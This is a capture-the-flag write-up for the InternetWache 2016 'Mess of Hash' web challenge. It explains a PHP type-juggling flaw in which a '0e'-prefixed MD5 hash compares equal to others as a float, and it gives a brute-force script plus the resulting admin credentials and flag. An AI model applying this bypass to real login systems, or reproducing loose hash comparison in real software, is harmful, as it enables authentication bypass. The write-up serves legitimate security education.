+++
authors = "simonvik"
categories = [ "writeups" ]
date = "2016-02-21T20:00:12+01:00"
description = ""
title = "InternetWache 2016 Mess of Hash (Web 50) "

+++

# Problem
> Description: Students have developed a new admin login technique. I doubt that
it's secure, but the hash isn't crackable. I don't know where the problem is...

(web50, solved by 170)

Attachment: web50.zip

Service: https://mess-of-hash.ctf.internetwache.org/

# Solution

We unpack the attachment and get a README.txt containing:

~~~PHP
<?php

$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {
    return preg_replace("/[^0-9a-f]/","",$hash);
}

function myhash($str) {
    return clean_hash(md5(md5($str) . "SALT"));
}
~~~

We can directly see that the hash assigned to `$admin_pw` looks interesting.

From knowing PHP we know that it can cast strings containing numbers to floats and `0e408306536730731920197920342119` is a valid number.

We also know that the precision of floats in php is limited.

We can now assume that all we need to do is to generate a new hash with the format of 0e.... that is equal the float of `0e408306536730731920197920342119`.

I hacked together the following small script that bruteforces a new password where `(float) hash == (float) 0e408306536730731920197920342119`

~~~PHP
<?php

function clean_hash($hash) {
    return preg_replace("/[^0-9a-f]/","",$hash);
}

function myhash($str) {
    return clean_hash(md5(md5($str) . "SALT"));
}

function randomPassword() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array(); //remember to declare $pass as an array
    $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); //turn the array into a string
}

while(true){
	$pass = randomPassword();

	if(myhash($pass) == "0e408306536730731920197920342119"){
		echo myhash($pass), "\n";
		echo $pass, "\n";
	}
}
~~~


After a few minutes we get a new password and hash.

The first password we get is `FbTaQN1k`:

And the resulting hash is: `0e137008612571603628970211017933`.

We can now log into https://mess-of-hash.ctf.internetwache.org/ with `pr0_adm1n:FbTaQN1k`.

And we now have the flag : **IW{T4K3_C4RE_AND_C0MP4R3}**.
